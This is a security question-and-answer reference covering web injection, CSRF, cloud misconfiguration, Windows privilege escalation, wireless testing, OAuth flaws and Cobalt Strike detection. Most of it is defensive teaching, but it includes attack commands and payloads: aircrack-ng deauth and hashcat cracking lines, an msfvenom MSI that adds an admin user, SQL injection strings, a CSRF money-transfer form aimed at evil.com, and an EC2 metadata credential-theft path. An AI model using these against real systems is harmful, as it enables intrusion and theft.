Delegation: constrained delegation: service can authenticate to specific other services as user; unconstrained delegation: service can authenticate to any service as user (dangerous); resource-based constrained delegation (RBCD): target resource controls who can delegate to it.
What is output encoding and when should you use it?

Output encoding: convert data to safe representation for specific output context; prevents injection attacks. Different contexts require different encoding: HTML context (between tags): HTML entity encode: < becomes <, > becomes >, & becomes &, double quote becomes ", single quote becomes '; encoded characters display correctly to user but browser treats as text not markup; prevents XSS where attacker tries to inject HTML tags. HTML attribute context: HTML attribute encode; same as HTML plus all non-alphanumeric characters encoded; attribute values should always be quoted: value= vs value= (unquoted attributes context-dependent); never put user data in href, src, action, on* event handlers, style (different contexts). JavaScript context: JavaScript encode; encode all non-alphanumeric characters as Unicode escape sequences (\uXXXX); prevents injection of JavaScript code; never put user data inside string delimiters without encoding; never use eval() or innerHTML with user data. URL context: URL encoding (percent encoding): spaces become %20, special chars encoded; use encodeURIComponent() for parameter values; encodeURI() for full URL (does not encode URL delimiters like /); never concatenate user input directly into URL without encoding. CSS context: CSS encode all non-alphanumeric chars; user data in CSS context rare and high risk; easier to validate against allowlist than encode. SQL context: parameterised queries (not output encoding); prepared statements prevent SQL injection more reliably than encoding/escaping; if parameterised queries impossible: database-specific escaping (mysql_real_escape_string in PHP -- last resort). Command context: never pass user input to shell commands; use language APIs that avoid shell (subprocess without shell=True in Python; ProcessBuilder in Java); if unavoidable: allowlist validation only (not escaping -- escaping is error-prone). Context ordering: determine output context FIRST; select appropriate encoding; apply consistently (one missed encoding = XSS); use trusted libraries (OWASP Java Encoder,.NET AntiXSS, Ruby html_escape, PHP htmlspecialchars with correct flags); correct flags: htmlspecialchars($data, ENT_QUOTES, UTF-8) -- ENT_QUOTES encodes both single and double quotes; character set: always specify UTF-8; mismatch can lead to encoding confusion attacks.
How do you assess wireless network security?

Wireless security assessment: identify vulnerabilities in Wi-Fi infrastructure and connected devices. Hardware and software needed: wireless adapter supporting monitor mode and packet injection (Alfa AWUS036ACH, Alfa AWUS036NH -- older chipsets: Atheros AR9271, Realtek RTL8812AU); Kali Linux with aircrack-ng suite; antenna for extended range if needed. Reconnaissance: airmon-ng start wlan0 (enable monitor mode); airodump-ng wlan0mon (discover all nearby access points); information collected: BSSID (AP MAC), SSID, channel, encryption type (WPA2, WPA3, WEP, Open), cipher (CCMP, TKIP), authentication (PSK, MGT=Enterprise), signal strength, connected clients. WPA2 Personal (PSK) testing: capture 4-way handshake (required for offline cracking): airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon; deauthentication attack to force reconnect (aireplay-ng -0 1 -a BSSID -c CLIENT_MAC wlan0mon); capture handshake when client reconnects; crack offline: hashcat -m 22000 capture.hc22000 wordlist.txt (mode 22000 = WPA PMKID/handshake); rockyou.txt + best64.rule; PMKID attack (no client required): hcxdumptool to capture PMKID from AP; convert with hcxtools; crack with hashcat -m 22000. Enterprise (802.1X) testing: identify authentication protocol: PEAP-MSCHAPv2 (most common); EAP-TTLS; EAP-TLS; hostapd-wpe (Wireless Pwnage Edition): creates rogue AP that captures MSCHAPv2 credentials; crack with asleap (hashcat soon); certificate validation: if client validates server certificate: rogue AP fails (correct configuration); if not validating: MITM; configure test: does client connect to rogue AP with self-signed cert? Identify misconfigurations: open networks (no encryption); WEP (broken -- IV collision attack recovers key in minutes); WPS enabled (Pixie Dust and online bruteforce attacks against WPS PIN); TKIP (deprecated -- vulnerable to TKIP attacks); default SSID and password on AP; SSID broadcasting unnecessary information (corporate name, location). Client-side: evil twin attack; deauth targeted clients from real AP; they reconnect to evil twin; MitM. Reporting: list all SSIDs and encryption types; identify weak encryption; captive portal assessment; rogue AP detection; client isolation (can clients reach each other on guest network?); network separation (guest from corporate).
What is a cross-site request forgery (CSRF) attack?

CSRF (Cross-Site Request Forgery): attacker tricks victim browser into sending authenticated request to target site without victim knowledge. How it works: victim is logged into bank.com (session cookie in browser); attacker sends link to evil.com; victim opens evil.com; evil.com has hidden form or img tag that makes request to bank.com: GET https://bank.com/transfer?to=attacker&amount=1000; browser automatically includes bank.com session cookie; bank.com sees authenticated request and processes it; victim unknowingly transferred money. Example: HTML on evil.com: form action=https://bank.com/transfer method=POST; input name=to value=attacker; input name=amount value=1000; JavaScript auto-submit on page load; or: img src=https://bank.com/transfer?to=attacker&amount=1000 (GET-based actions). Conditions: victim must be authenticated to target site; session cookie sent automatically by browser; target site must accept request based on cookie alone (no additional verification). SameSite cookie attribute: SameSite=Strict: cookie never sent with cross-site requests; SameSite=Lax: cookie sent with same-site requests and top-level navigation GET only; SameSite=None: cookie sent with all cross-site requests (requires Secure flag; old browser behavior); Chrome default is SameSite=Lax since 2020 (protects most CSRF vectors by default). CSRF tokens: server generates cryptographically random token per session; embeds in all forms and AJAX headers; validates token on every state-changing request; token not accessible from cross-site (no CORS, not in cookie); standard mitigation alongside SameSite cookies. Custom request headers: AJAX requests with custom header (X-Requested-With: XMLHttpRequest) cannot be sent cross-site without CORS permission; browsers block cross-origin requests with custom headers (preflight required); simple defence for API endpoints. Double submit cookie: generate random token; set as cookie AND include in form/request body; server validates both match; attacker cannot set cookie for another domain; defence without server-side state. Double-checking origin: validate Origin and Referer headers; both must match expected domain; attacker site requests have different Origin. Testing: identify state-changing requests (POST, PUT, DELETE); attempt to replay request from different origin (CSRF PoC generator in Burp Suite); if request succeeds without valid CSRF token: vulnerable.
What is multi-tenant security in cloud environments?

Multi-tenancy: multiple customers sharing same underlying infrastructure; cloud providers run thousands of tenants on shared hardware, hypervisors, and networks. Security concerns: tenant isolation failure: if isolation breaks, one tenant accesses another tenant data or resources; side-channel attacks: CPU cache timing attacks (Spectre, Meltdown) can leak data across VM boundaries on shared hardware; noisy neighbour: one tenant resource-intensive workload impacts other tenants performance; shared services security: DNS, NTP, DHCP shared across tenants; compromise of shared service impacts all tenants. Hypervisor security: hypervisor (VMware ESXi, KVM, Hyper-V, Xen) isolates VMs; hypervisor vulnerability = all tenant VMs compromised; hypervisor escapes: CVE-2018-3646 (L1TF / Foreshadow: speculative execution attack from VM to hypervisor or other VMs); VENOM (CVE-2015-3456: virtual floppy drive buffer overflow allowed VM escape); hypervisor vendors patch continuously; cloud providers apply mitigations (IBRS, STIBP, microcode updates); customers: no visibility into hypervisor; must trust cloud provider. SaaS multi-tenancy: application stores all customer data in shared database; tenant ID used to partition data: WHERE tenant_id = CUSTOMER_ID; IDOR vulnerability: missing tenant_id check allows accessing other tenant data; common finding in SaaS application pentests; row-level security (PostgreSQL RLS, Snowflake): enforce tenant isolation at database level (not just application); database refuses to return other tenant rows even if application makes mistake. Network isolation: public cloud: VPCs isolate customer networks; security groups control traffic; shared hypervisor networking stack isolates VMs; shared responsibility model: cloud provider secures infrastructure; customer secures workloads and data. Customer controls in public cloud: data encryption: encrypt with customer-managed keys (BYOK -- Bring Your Own Key); if cloud provider employee accesses data: encrypted and unreadable; compliance: SOC 2 Type II, ISO 27001, PCI DSS certifications cover cloud provider infrastructure; customers still responsible for their configuration and workloads; dedicated tenancy: AWS Dedicated Instances or Dedicated Hosts: physical isolation from other customers; higher cost; for regulated industries or high-security requirements.
What is an SQL injection in a stored procedure context?

Stored procedure SQL injection: vulnerabilities in SQL stored procedures; different attack surface than dynamic SQL in application code. Misconception: stored procedures NOT inherently safe from SQL injection; depends on how they use their parameters. Vulnerable pattern in stored procedure: CREATE PROCEDURE GetUser @username NVARCHAR(100) AS BEGIN DECLARE @sql NVARCHAR(200); SET @sql = SELECT * FROM users WHERE username= + @username; EXEC(@sql); END; input: admin OR 1=1-- results in: SELECT * FROM users WHERE username=admin OR 1=1--; same SQLi as dynamic SQL in application code; using EXEC() or sp_executesql with string concatenation inside stored proc = same vulnerability. Safe stored procedure pattern: CREATE PROCEDURE GetUser @username NVARCHAR(100) AS BEGIN SELECT * FROM users WHERE username = @username; END; direct parameter use without string concatenation; database parameterises at SP level; SQLi not possible. MSSQL xp_cmdshell: if SP has EXECUTE AS with elevated permissions; xp_cmdshell executes OS commands; EXEC xp_cmdshell (whoami); SP that calls xp_cmdshell with user input: critical SQL injection to OS command injection. MySQL stored procedures: PREPARE stmt FROM CONCAT(SELECT * FROM users WHERE id=, userId); EXECUTE stmt; same dynamic SQL vulnerability. Second-order SQL injection: user input safely stored in DB using parameterised query; later retrieved and used unsafely in dynamic SQL without re-parameterising; user registers with username: admin--; stored safely; later: dynamic query concatenates stored username without parameterisation; SQL injection via stored data. Identification: review all EXEC() and sp_executesql calls in stored procedures; check if parameters concatenated into SQL string before EXEC; check for EXEC AS OWNER or elevated privilege contexts; test: input SQL metacharacters (single quote, double dash, semicolon); time-based: WAITFOR DELAY 0:0:5 to confirm blind injection. Remediation: always use parameterised sp_executesql when dynamic SQL unavoidable: EXEC sp_executesql @sql, N@username NVARCHAR(100), @username=@username; prefer non-dynamic SQL in stored procedures; least privilege: stored procedures run with minimum required permissions; principle of least privilege prevents OS-level impact from SQLi in database.
How do you detect and prevent lateral movement in a network?

Lateral movement detection and prevention: identify and stop attacker traversal from initial foothold to target systems. Common lateral movement techniques: PsExec (port 445 SMB + IPC$ share); WMI (port 135 + ephemeral); PowerShell Remoting (port 5985/5986 WinRM); RDP (port 3389); Pass-the-Hash (NTLM authentication with stolen hash); Pass-the-Ticket (Kerberos ticket reuse); Golden/Silver Ticket; DCOM; SSH (Linux); LDAP-based (BloodHound-identified attack paths); VNC, TeamViewer credential abuse. Detection sources: Windows Event Logs on destination host: Event 4624 (network logon type 3) from unusual source; Event 4648 (explicit credential use); Sysmon Event 3 (network connections) from unexpected source; WMI activity logs (5858, 5861); network-level: firewall/NetFlow logs: workstation-to-workstation SMB (port 445) -- unusual in most environments; RDP from non-admin workstation; WMI between workstations; SIEM correlation: same account authenticating to many hosts in short window; new host appearing in network with many connections to existing hosts; lateral movement velocity (how many hosts touched per time unit). Prevention: network segmentation: workstations cannot directly communicate with each other (inter-workstation traffic blocked by firewall); must go through jump server or segmentation gateway; this eliminates most PtH, PsExec, WMI lateral movement; privileged access workstations (PAWs): admin accounts only usable from dedicated admin workstations; regular user accounts cannot RDP to servers; LAPS: unique local admin password per workstation; eliminates PtH from one workstation to all others via shared local admin; SMB signing: prevents man-in-the-middle relay attacks that enable lateral movement via captured challenge; required on DCs by default; should be required on all workstations; PowerShell Remoting restrictions: WinRM firewall rules; JEA (Just Enough Administration) to limit what remote PowerShell can do; credential protection: Credential Guard; Protected Users group; disable NTLM where possible; MFA for RDP and remote management; tiering: Tier 0 (DCs), Tier 1 (servers), Tier 2 (workstations); admin accounts only valid within their tier; prevents privilege escalation via lateral movement across tiers.
What are common cloud misconfigurations attackers exploit?

Cloud misconfigurations: most common cloud breach root cause; often introduced via human error, IaC mistakes, or default configurations. S3 (Simple Storage Service): public access: bucket or objects publicly readable; bucket policy with Principal:* or ACL public-read; AWS has Block Public Access account-level setting (often overridden); common cause of data breaches (Capital One, GoDaddy, Twitch); discovery: Shodan, GrayhatWarfare.com S3 bucket search, bucket enumeration tools. IAM over-privilege: wildcard permissions: Action:* Resource:* (admin for all services); managed policies attached to all users for convenience; EC2 instance profiles with admin access; service accounts not used for years still active; MFA not required; access keys never rotated (or never expiring). Security group misconfigurations: port 22 (SSH) or 3389 (RDP) open to 0.0.0.0/0; database ports (3306, 5432, 1433) internet-accessible; port 0-65535 wide open (misconfigured Allow All); internal management ports exposed. Secrets in code and config: access keys committed to GitHub (GitGuardian, TruffleHog, GitHub secret scanning); env files with secrets committed; userdata (EC2 launch script) containing credentials (userdata readable via metadata endpoint); Systems Manager Parameter Store used incorrectly (SecureString vs String). Logging disabled: CloudTrail not enabled in all regions; S3 access logging disabled; VPC flow logs disabled; CloudWatch alarms not configured; no GuardDuty. Metadata service: IMDSv1 (no auth): any process on EC2 can request metadata; SSRF attack retrieves IAM credentials; IMDSv2 requires session token (PUT pre-flight); not enforced by default on older instances; attacker exploits SSRF to steal IAM credentials from metadata endpoint http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE. Public AMI/Snapshot: EBS snapshot marked public; AMI public; contains sensitive data (credentials, database, code); discovered by scanning public AMI/snapshot databases. Lambda security: environment variables (cleartext) visible to IAM users with lambda:GetFunctionConfiguration; over-permissive lambda execution role; unvalidated event inputs causing injection; secrets in code zip. Detection: AWS Security Hub, Prowler, ScoutSuite, CSPM tools scan for all these continuously.
What is SAST and how does it find vulnerabilities?

SAST (Static Application Security Testing): analysis of source code or bytecode without execution; finds security vulnerabilities at development time. How it works: AST (Abstract Syntax Tree) analysis: parse source code into AST; analyse structure for patterns (function calls with dangerous parameters); more accurate than regex; Data flow analysis (taint analysis): track user-controlled input (source) through code to dangerous operations (sink); source: HTTP request parameter, user input, environment variable; sink: SQL query, OS command, file write, eval(); taint: propagation of user-controlled data; if source reaches sink without sanitisation: vulnerability found (SQLi, RCE, XSS, path traversal); control flow analysis: analyse all code paths; find logic errors (auth bypass if specific condition met); pattern matching: regex or AST patterns for known vulnerable code (strcpy, gets, eval, innerHTML, etc.). SAST tools: Semgrep: fast, open-source; patterns written in YAML; 1000+ community rules; language-agnostic; excellent false positive rate; custom rules easy to write; runs locally or in CI/CD; CodeQL (GitHub): powerful data flow analysis; finds complex vulnerabilities other tools miss; requires CodeQL query writing; free for open-source; Checkmarx SAST (enterprise): comprehensive; deep data flow; many languages; expensive; Veracode SAST: SaaS; developer training integration; OWASP benchmark compliance; SonarQube: code quality + security; many languages; free community edition; integrates with CI/CD; SpotBugs + FindSecBugs: Java-focused; good for Java Spring security issues. Strengths: no running application needed; runs early in SDLC (IDE plugin or CI/CD); 100% code coverage (unlike DAST which only covers reachable endpoints); finds vulnerabilities in code paths that tests do not exercise; good for: SQL injection patterns, hardcoded credentials, insecure crypto, path traversal, command injection patterns. Weaknesses: false positives (up to 30-40% for some tools; require tuning); misses runtime issues (authentication/authorisation logic, business logic flaws); language-specific (different tool per language or limited language support); slow on very large codebases. Integration: IDE plugin (SonarLint, Semgrep): real-time feedback; developer sees issue as they type; CI/CD gate: fail PR if new Critical/High introduced; don't block on existing debt (separate technical debt queue); alert vs block policy: informational findings alert; high findings comment on PR; critical findings block merge.
What is input validation and how should it be implemented?

Input validation: verify all user-supplied data meets expected format, type, range, and constraints before processing; first line of defence against injection attacks. Why it matters: all injection vulnerabilities (SQLi, XSS, command injection, XXE, SSRF, path traversal) exploit failure to validate input; even with parameterised queries and output encoding: defence in depth requires validation. Principles: validate on server side: client-side validation is UX improvement only; bypass trivially with Burp Suite; server-side mandatory; validate as early as possible: reject invalid input before any processing; fail closed: reject anything that does not match expected format; allowlist not denylist: define what is ALLOWED not what is forbidden; denylist always incomplete (attacker finds bypass); never trust headers: X-Forwarded-For, X-Real-IP, Referer, User-Agent, Cookie -- all attacker-controlled. Types of validation: Type validation: is this an integer? a date? a UUID? reject if wrong type; Range validation: integer between 1 and 100? date in acceptable range? reject outside range; Length validation: maximum string length; prevents buffer overflows in legacy systems and DoS via huge inputs; Format validation: email regex, IP address format, credit card Luhn check, phone number format; Allowlist character validation: only alphanumeric + specific characters? reject everything else (prevents injection characters); Business logic validation: does this order ID belong to this user? is this quantity positive? is this discount code valid and not used? Regex pitfalls: catastrophic backtracking (ReDoS): complex regex on long input causes exponential backtracking; DoS via crafted input; /^(a+)+$/ on aaaaaX takes exponential time; use simple regexes or timeout limits; anchoring: ensure regex anchored to full string (^...$) not partial match; PHP 5 multiline mode bypass: $ matches before newline in PHP -- use \z instead. Implementation: centralise validation logic (one place, consistent); use library functions (OWASP Java HTML Sanitizer, Python html.escape, Django forms validation); parameterise all DB queries regardless of validation (defence in depth); Content-Type validation: verify file upload MIME type from magic bytes not just extension or Content-Type header; strip or reject unexpected characters in filenames. What validation cannot do: cannot completely prevent all injection (some characters legitimate in context); must combine with: parameterised queries (SQL), output encoding (XSS), allowlist commands (OS), Content Security Policy (XSS in depth).
What is role-based access control implementation in web apps?

RBAC implementation in web applications: assign permissions to roles and roles to users. Data model: User table: id, email, password_hash; Role table: id, name (admin, editor, viewer, manager); UserRole table: user_id, role_id (many-to-many); Permission table: id, resource, action (users:read, users:write, orders:delete, reports:view); RolePermission table: role_id, permission_id. Check authorisation on every request: middleware or decorator pattern; check before processing: def require_permission(permission): if not current_user.has_permission(permission): return 403 Forbidden. Never trust client-supplied role: do not include role in JWT or session and trust it without verification; fetch permissions from database per request (or cache with short TTL); role changes take effect immediately. Common mistakes: checking role at login time but not per-request: user demoted mid-session; stale role in session; checking only at UI level: API endpoints not protected; attacker calls API directly; horizontal privilege escalation: role check prevents admin functions but not accessing other user data (missing object-level check: user can view their own orders, not others); check both role AND ownership. Flat vs hierarchical roles: flat: Admin, Editor, Viewer (simple, common); hierarchical: SuperAdmin > Admin > Manager > User (inheritance of permissions); hierarchical complex to implement correctly; usually flat roles lists. Claims-based (RBAC via JWT/OIDC): include roles or permissions in JWT claims: {sub: userid, roles: [admin, editor], permissions: [users:write]}; validate JWT signature; check claim server-side; never trust unsigned claims; claims from trusted IdP. Attribute-based enhancement: combine RBAC with attribute checks: user has editor role AND document.owner == user.id OR user has admin role; more flexible than pure RBAC; ABAC extension. Testing RBAC: create accounts for each role; test all endpoints with each role; expect 403 for unauthorised roles; test with no authentication (expect 401); test with valid token from different user (IDOR test); test role escalation (regular user performing admin action).
What is security logging and monitoring?

Security logging: capturing events relevant to security; foundation of detection and incident response. What to log: authentication events: login success and failure (include source IP, username, timestamp, geolocation); MFA events; password reset and changes; authorisation events: access to sensitive resources; privilege use; permission changes; account management: account creation, deletion, modification; role changes; password changes; application events: high-value transactions (payment, transfer, export); API calls; data access (sensitive records viewed); error events: application errors (stack traces can reveal internal structure -- log but do not expose to user); repeated errors (brute force indicator); security control events: firewall changes; security policy changes; certificate operations; system events: service start/stop; scheduled task creation; software installation; network events: connections to/from sensitive systems; DNS queries; proxy access logs. What NOT to log: passwords (even attempted); credit card numbers; PII in excess of what needed for forensics; session tokens or authentication tokens (if logged, replay possible); private encryption keys. Log quality: format: structured logs (JSON or CEF -- Common Event Format) better than free-text; parseable by SIEM; timestamp: UTC timezone with millisecond precision; correlation ID: unique ID per request to correlate across microservices; context: include user_id, session_id, source_ip, resource, action, outcome; actionable: logged event must provide enough context to investigate. Log integrity: write-once logs: attacker cannot modify SIEM logs; centralise immediately (forward before local deletion is possible); hash chaining: tamper-evident log sequences; WORM storage. Monitoring and alerting: logs without monitoring have limited value; SIEM correlates events and generates alerts; SOC reviews alerts; response playbooks triggered. Regulatory requirements: GDPR: log access to personal data; PCI DSS 10.2: specific events required; HIPAA: access logging for PHI (Protected Health Information); SOX: financial system access logging; retention: PCI DSS: 12 months (3 months immediately available); SOX: 7 years; GDPR: as long as necessary for purpose. Monitoring checklist: alert on failed logins > threshold; alert on first-time admin login; alert on login from new country/IP; alert on bulk data export; alert on privilege escalation; alert on security control modification.
What is privilege escalation via service misconfiguration on Windows?

Windows service misconfigurations: common privilege escalation vector; services run as SYSTEM or elevated accounts. Unquoted service paths: Windows searches for binary: if path is C:\Program Files\My App\service.exe (unquoted with spaces); Windows tries: C:\Program.exe, then C:\Program Files\My.exe, then C:\Program Files\My App\service.exe; if attacker can write C:\Program.exe or C:\Program Files\My.exe: code executes as service account (often SYSTEM); check with sc qc SERVICENAME; look for ImagePath without quotes containing spaces; PowerUp: Get-ServiceUnquoted; check write permissions: icacls C:\ or icacls C:\Program Files\. Weak service binary permissions: service binary itself is writable by low-privilege user; replace binary with malicious executable; next service restart: malicious binary runs as service account; check: icacls C:\path\to\service.exe; look for (F) full control or (W) write for current user or Users group; PowerUp: Get-ModifiableServiceFile. Weak service registry permissions: registry key for service contains ImagePath; writable registry key allows changing ImagePath to malicious binary; HKLM\SYSTEM\CurrentControlSet\Services\SERVICENAME; check with PowerUp: Get-ModifiableRegistry; or manual: accesschk64.exe -kwsu HKLM\SYSTEM\CurrentControlSet\Services (accesschk from Sysinternals). Service binary DLL hijacking: service binary loads DLL from path search order; if DLL not found in current directory but current directory writable: place malicious DLL with expected name; service loads it as SYSTEM; common with services that load optional DLLs. Always Install Elevated: registry keys: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated = 1; HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated = 1; BOTH must be set; msiexec installs MSI as SYSTEM regardless of user privilege; generate malicious MSI: msfvenom -p windows/exec CMD=net user hacker Password123 /add -f msi; install: msiexec /quiet /qn /i payload.msi. Exploitation tools: PowerUp: all checks in one PowerShell script; Invoke-AllChecks; BeRoot: Windows privilege escalation script; WinPEAS: broader Windows enumeration including service misconfigs; Metasploit: post/multi/recon/local_exploit_suggester (suggests applicable privesc modules).
What are Content Security Policy (CSP) headers?

CSP (Content Security Policy): browser security mechanism; restricts sources of content that pages can load; primary XSS mitigation at browser level. How it works: server sends Content-Security-Policy HTTP header with policy directives; browser enforces: blocks loading scripts, styles, images, etc. from unauthorised sources; reduces XSS impact (even if attacker injects script: browser blocks execution if source not whitelisted). Policy directives: default-src: fallback for other directives not specified; script-src: allowed JavaScript sources; style-src: allowed CSS sources; img-src: allowed image sources; connect-src: allowed AJAX, WebSocket, EventSource destinations; frame-src: allowed iframe sources; font-src: allowed font sources; object-src: allowed Flash/plugin sources; form-action: allowed form action destinations; frame-ancestors: who can embed page in iframe (replaces X-Frame-Options). Source values: none: block all; self: same origin only; https://trusted.com: specific origin; https://*.trusted.com: subdomain wildcard; data: allow data: URIs (dangerous for scripts); nonce-RANDOM: allow script with matching nonce attribute; sha256-HASH: allow script matching specific hash; unsafe-inline: allow inline scripts (defeats much of XSS protection -- avoid); unsafe-eval: allow eval() (avoid). Strict CSP: nonce-based: server generates cryptographically random nonce per request; adds to CSP header: script-src nonce-RANDOMNONCE; adds nonce attribute to all legitimate script tags; injected scripts lack nonce -- blocked; attacker cannot predict nonce; hash-based: compute SHA-256 of each inline script; include in CSP: script-src sha256-HASH; scripts exactly matching hash allowed; injected scripts have different content -- blocked. CSP bypass techniques: if unsafe-inline allowed: trivially bypassed; JSONP endpoint on whitelisted domain: callback=alert(1); Angular or other JS frameworks loaded from CDN with unsafe eval-like capabilities; base-uri not set: base tag injection changes relative URL resolution; script-src wildcard (*.trusted.com): if attacker controls subdomain of trusted.com (subdomain takeover): loads malicious script from that subdomain; form-action missing: form can submit to any origin (steals CSRF token or form data). Reporting: report-uri: CSP-violations reported to endpoint; report-only mode (Content-Security-Policy-Report-Only): monitor without enforcement; build policy incrementally; CSP Evaluator (Google): test policy strength.
What is access control bypass and how do you test for it?

Access control bypass: access resources or perform actions without proper authorisation; OWASP Top 10 A01 (2021). Types: Vertical privilege escalation (BFLA -- Broken Function Level Authorisation): regular user accesses admin functions; horizontal privilege escalation (BOLA/IDOR -- Broken Object Level Authorisation): access another user same-level data; missing function-level access control: endpoint enforces auth on GET but not POST/PUT/DELETE; different HTTP methods to same resource. Testing methodology: map all endpoints and functions; for each: identify required role/permission; create test accounts for each role; attempt each action with each role; verify 403 for unauthorised roles; verify 401 for unauthenticated. Horizontal IDOR testing: create two test accounts (user A and user B); perform action as user A generating resource ID; attempt to access resource with user B account; change ID in URL, request body, or headers; expect 403 or 404; if resource returned: IDOR. Common IDOR locations: URL parameters: /api/users/123/profile (change 123 to 124); request body: {userId: 123}; cookies or session: user ID in cookie (change it); hidden form fields; response bodies (resource IDs to try). Vertical privilege escalation testing: identify admin endpoints (common paths: /admin, /management, /superuser, /console, /config); attempt with regular user session; check if HTTP method matters: GET /admin/users returns 403, POST /admin/users? same endpoint? check if UI changes disabling features: same endpoints still accessible directly via API even if button hidden. Test cases: remove auth token entirely (expect 401); use expired token (expect 401); use different user valid token; use lower-role token on high-role endpoint; change role claim in JWT (if RS256: cannot forge; if HS256: try none algorithm or weak secret); access previous versions of API (/api/v1/ vs /api/v2/); access documentation endpoints; access metrics and health check endpoints (often unauthenticated). Fuzzing access control: ffuf -u https://target.com/api/FUZZ -w paths.txt -H Authorization: Bearer USER_TOKEN -mc 200,201 (find paths returning 200 with regular user token).
How does Cobalt Strike work and how do you detect it?

Cobalt Strike: commercial adversary simulation tool; used legitimately by red teams; widely abused by threat actors; most prevalent C2 framework in real attacks. Components: Team Server: attacker-controlled server; runs on Linux; manages beacons and operators; Beacon: payload deployed on victim; lightweight; callbacks to Team Server; Malleable C2 profiles: customise beacon network traffic (mimic legitimate software traffic patterns); Arsenal Kit: add-ons. Beacon types: HTTP/HTTPS beacon: default; callbacks over HTTP or HTTPS; SMB beacon: pivoting within internal network (SMB named pipe); DNS beacon: C2 via DNS (stealthy; slow); TCP beacon: raw TCP; peer-to-peer (P2P) beacon: chain beacons (beacon A relays beacon B traffic to team server). Malleable C2: operators write profiles to make beacon traffic look like: Office 365, Google, Amazon, Slack, banking apps; changes: URI paths, HTTP headers, user-agent strings, data encoding, staging; evade network-based detection. Beacon functionality: sleep interval and jitter; file upload/download; process injection (spawn-to: inject into specified process); execute-assembly (run.NET assembly in memory); lateral movement commands (psexec, wmi, winrm); credential operations (hashdump, mimikatz/kiwi); port scan; pivoting; screenshots; keylogging. Detection: network: JA3/JA3S TLS fingerprinting: Cobalt Strike has distinctive TLS fingerprint (malleable profiles can change but many real-world deployments use defaults); beacon watermark: CS team server embeds watermark (licence ID) in beacon DLL; default port: 443, 80, 8080 (but configurable); periodic connection interval (jitter makes less regular but still detectable vs constant stream); JARM fingerprinting: server-side TLS fingerprint of team server; Cobalt Strike has characteristic JARM; even with custom certificates. Endpoint: cs-detect rules (YARA): match known Cobalt Strike patterns in memory or on disk; beacon payloads have identifiable structure even encoded; process injection patterns: CreateRemoteThread, VirtualAllocEx, WriteProcessMemory followed by CreateRemoteThread; Sysmon events 8 (CreateRemoteThread), 10 (ProcessAccess for injection); EDR: CrowdStrike, SentinelOne have specific Cobalt Strike detection; memory scanning for beacon configuration. License watermark: researchers (CobaltStrikeParser) extract beacon configuration; watermark identifies CS licence number; FBI and security firms used to track threat actor CS licences across campaigns.
What is OAuth 2.0 security testing?

OAuth 2.0 security testing: common vulnerabilities in OAuth implementations. CSRF on authorization endpoint: missing state parameter; if state not validated: attacker can initiate OAuth flow with victim (CSRF of OAuth); attacker gets victim bound to attacker account; test: remove state parameter or modify it; if flow completes: vulnerable. Open redirect in redirect_uri: OAuth code returned to redirect_uri; if redirect_uri validation too loose: attacker redirects code to attacker server; steal auth code; validate redirect_uri is exact match to registered URI (not prefix match). redirect_uri manipulation: some implementations accept redirect_uri as long as it contains registered domain: client registers https://legit.com; attacker submits https://legit.com.evil.com (contains legit.com); code sent to evil.com; or: https://legit.com@evil.com (credentials in URL); path manipulation: https://legit.com/../other/ if parent path also in scope. Implicit flow IDOR: implicit flow returns token in URL fragment (#access_token=...); token in browser history; logged by server if page loaded with token in URL; token can leak via Referer header; use auth code flow + PKCE instead. Token substitution: if application uses JWT access token: try algorithm none (remove signature, change claims); try weak HS256 key brute force; try RS256 confusion (provide HS256 signed with public key). Scope escalation: request token with limited scope; attempt to access resource requiring higher scope without re-authorising; scope enforcement at resource server. Client credential theft: confidential clients require client_secret; if client_secret stored in mobile app: extractable (decompile, strings, dynamic analysis); public client (SPA, mobile): cannot have secret; must use PKCE. Token leakage: tokens in server-side logs; tokens in browser history (implicit flow); tokens in Referer header (redirect after OAuth with token in URL); tokens in JavaScript error reports (Sentry, Bugsnag). Account linking CSRF: if OAuth allows linking to existing account: CSRF attacker links victim account to attacker social identity; steals victim account. Testing tools: PortSwigger Web Security Academy OAuth labs; Burp Suite intercept OAuth flows; manual parameter manipulation.
What are web security headers and how do you implement them?

Security response headers: HTTP response headers that instruct browser to enable security features; easy to implement with high security value. Critical headers: Strict-Transport-Security (HSTS): tells browser to always use HTTPS for domain; Strict-Transport-Security: max-age=31536000; includeSubDomains; preload; max-age: how long browser remembers (1 year recommended); includeSubDomains: apply to all subdomains; preload: submit to browser preload list (HTTPS always used even on first visit before server response); only add preload if all subdomains support HTTPS. Content-Security-Policy (CSP): control what content browser can load (see CSP entry); Content-Type: X-Content-Type-Options: nosniff: prevent browser from MIME-sniffing response content type; stops browser from treating HTML file as JavaScript if served with wrong Content-Type; X-Frame-Options: DENY or SAMEORIGIN (use CSP frame-ancestors instead for new implementations); prevent clickjacking; DENY: cannot be framed anywhere; SAMEORIGIN: only same origin can frame. Referrer-Policy: control Referer header sent on navigation; Referrer-Policy: strict-origin-when-cross-origin (send full URL for same-origin, only origin for cross-site); no-referrer: never send; prevents leaking sensitive URLs (auth tokens in URL, internal paths) to third parties. Permissions-Policy (formerly Feature-Policy): disable browser features not needed; Permissions-Policy: camera=(), microphone=(), geolocation=() (disable camera, mic, geolocation for all origins); reduces attack surface. Clear-Site-Data: on logout: Clear-Site-Data: cache, cookies, storage (clear all browser data for site); ensures clean logout. X-XSS-Protection: deprecated (CSP replaces it); X-XSS-Protection: 1; mode=block (filter mode enabled; block if XSS detected); do not use in modern implementations (CSP instead); may create vulnerabilities in some browsers. Cross-Origin headers: CORS (Access-Control-Allow-Origin): who can make cross-origin requests; never use * for credentialed requests; COEP (Cross-Origin-Embedder-Policy: require-corp); COOP (Cross-Origin-Opener-Policy: same-origin): isolation from cross-origin windows; CORP (Cross-Origin-Resource-Policy: same-site); together enable SharedArrayBuffer (needed for spectre mitigations). Testing: SecurityHeaders.com scores headers; Mozilla Observatory: comprehensive header and SSL analysis; automated check with nikto or Burp Scanner.
How do you use Wireshark for security analysis?

